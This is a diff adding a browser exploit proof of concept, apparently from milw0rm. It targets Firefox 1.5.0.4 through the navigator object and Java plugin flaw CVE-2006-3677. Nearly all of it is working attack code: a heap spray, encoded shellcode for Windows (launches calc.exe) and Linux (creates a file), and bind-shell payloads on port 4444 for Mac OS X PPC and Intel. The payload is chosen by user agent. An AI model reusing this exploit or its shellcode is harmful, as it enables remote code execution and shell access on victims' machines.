@@ -1,0 +1,126 @@
+<!--
+Firefox <= 1.5.0.4 Javascript navigator Object Code Execution PoC 
+http://browserfun.blogspot.com/
+
+The following bug (mfsa2006-45) was tested on the Firefox 1.5.0.4 running 
+on Windows 2000 SP4, Windows XP SP4, and a recently updated Gentoo Linux system. 
+This bug was reported by TippingPoint and fixed in the latest 1.5.0.5 release of 
+Mozilla Firefox. This is different from the bug I reported (mfsa2006-48) and is 
+trivial to turn into a working exploit. The demonstration link below will attempt 
+to launch "calc.exe" on Windows systems and "touch /tmp/METASPLOIT" on Linux systems.
+
+window.navigator = (0x01020304 / 2);
+java.lang.reflect.Runtime.newInstance( java.lang.Class.forName("java.lang.Runtime"), 0);
+
+-->
+
+<html><body><script>
+
+// MoBB Demonstration
+function Demo() {
+
+	// Exploit for http://www.mozilla.org/security/announce/2006/mfsa2006-45.html
+	// https://bugzilla.mozilla.org/show_bug.cgi?id=342267
+	// CVE-2006-3677
+
+	// The Java plugin is required for this to work
+
+	// win32 = calc.exe
+	var shellcode_win32 = unescape('%ue8fc%u0044%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%uc031%u8b64%u3040%uc085%u0c78%u408b%u8b0c%u1c70%u8bad%u0868%u09eb%u808b%u00b0%u0000%u688b%u5f3c%uf631%u5660%uf889%uc083%u507b%u7e68%ue2d8%u6873%ufe98%u0e8a%uff57%u63e7%u6c61%u2e63%u7865%u0065');
+	var fill_win32 = unescape('%u0800');
+	var addr_win32 = 0x08000800;
+	
+	// linux = touch /tmp/METASPLOIT (unreliable)
+	var shellcode_linux = unescape('%u0b6a%u9958%u6652%u2d68%u8963%u68e7%u732f%u0068%u2f68%u6962%u896e%u52e3%u16e8%u0000%u7400%u756f%u6863%u2f20%u6d74%u2f70%u454d%u4154%u5053%u4f4c%u5449%u5700%u8953%ucde1%u8080');
+	var fill_linux = unescape('%ua8a8');
+	var addr_linux = -0x58000000; // Integer wrap: 0xa8000000
+
+	// mac os x ppc = bind a shell to 4444
+	var shellcode_macppc = unescape('%u3860%u0002%u3880%u0001%u38a0%u0006%u3800%u0061%u4400%u0002%u7c00%u0278%u7c7e%u1b78%u4800%u000d%u0002%u115c%u0000%u0000%u7c88%u02a6%u38a0%u0010%u3800%u0068%u7fc3%uf378%u4400%u0002%u7c00%u0278%u3800%u006a%u7fc3%uf378%u4400%u0002%u7c00%u0278%u7fc3%uf378%u3800%u001e%u3880%u0010%u9081%uffe8%u38a1%uffe8%u3881%ufff0%u4400%u0002%u7c00%u0278%u7c7e%u1b78%u38a0%u0002%u3800%u005a%u7fc3%uf378%u7ca4%u2b78%u4400%u0002%u7c00%u0278%u38a5%uffff%u2c05%uffff%u4082%uffe5%u3800%u0042%u4400%u0002%u7c00%u0278%u7ca5%u2a79%u4082%ufffd%u7c68%u02a6%u3863%u0028%u9061%ufff8%u90a1%ufffc%u3881%ufff8%u3800%u003b%u7c00%u04ac%u4400%u0002%u7c00%u0278%u7fe0%u0008%u2f62%u696e%u2f63%u7368%u0000%u0000');
+	var fill_macppc = unescape('%u0c0c');
+	var addr_macppc = 0x0c000000;
+	
+	// mac os x intel = bind a shell to 4444
+	// Thanks to nemo[at]felinemenace.org for shellcode
+	// Thanks to Todd Manning for the target information and testing
+	var shellcode_macx86 = unescape('%u426a%ucd58%u6a80%u5861%u5299%u1068%u1102%u895c%u52e1%u5242%u5242%u106a%u80cd%u9399%u5351%u6a52%u5868%u80cd%u6ab0%u80cd%u5352%ub052%ucd1e%u9780%u026a%u6a59%u585a%u5751%ucd51%u4980%u890f%ufff1%uffff%u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u5454%u5353%u3bb0%u80cd');
+	var fill_macx86 = unescape('%u1c1c');
+	var addr_macx86 = 0x1c000000;		
+
+
+	// Start the browser detection
+	var shellcode;
+	var addr;
+	var fill;
+	var ua = '' + navigator.userAgent;
+
+	if (ua.indexOf('Linux') != -1) {
+		alert('Trying to create /tmp/METASPLOIT');
+		shellcode = shellcode_linux;
+		addr = addr_linux;
+		fill = fill_linux;
+	}
+	
+	if (ua.indexOf('Windows') != -1) {
+		alert('Trying to launch Calculator');	
+		shellcode = shellcode_win32;
+		addr = addr_win32;
+		fill = fill_win32;
+	}	
+
+	if (ua.indexOf('PPC Mac OS') != -1) {
+		alert('Trying to bind a shell to 4444');
+		shellcode = shellcode_macppc;
+		addr = addr_macppc;
+		fill = fill_macppc;
+	}	
+	
+	if (ua.indexOf('Intel Mac OS') != -1) {
+		alert('Trying to bind a shell to 4444');
+		shellcode = shellcode_macx86;
+		addr = addr_macx86;
+		fill = fill_macx86;
+	}
+			
+	if (! shellcode) {
+		alert('OS not supported, only attempting a crash!');
+		shellcode = unescape('%ucccc');
+		fill = unescape('%ucccc');
+		addr = 0x02020202;
+	}
+		
+	var b = fill;
+	while (b.length <= 0x400000) b+=b;
+
+	var c = new Array();
+	for (var i =0; i<36; i++) {
+		c[i] = 
+			b.substring(0,  0x100000 - shellcode.length) + shellcode +
+			b.substring(0,  0x100000 - shellcode.length) + shellcode + 
+			b.substring(0,  0x100000 - shellcode.length) + shellcode + 
+			b.substring(0,  0x100000 - shellcode.length) + shellcode;
+	}
+			
+	
+	if (window.navigator.javaEnabled) {
+		window.navigator = (addr / 2);
+		try {
+			java.lang.reflect.Runtime.newInstance(
+				java.lang.Class.forName("java.lang.Runtime"), 0
+			);
+			alert('Patched!');
+		}catch(e){
+			alert('No Java plugin installed!');
+		}
+	}
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
+
+
+</body></html>
+
+# milw0rm.com [2006-07-28]
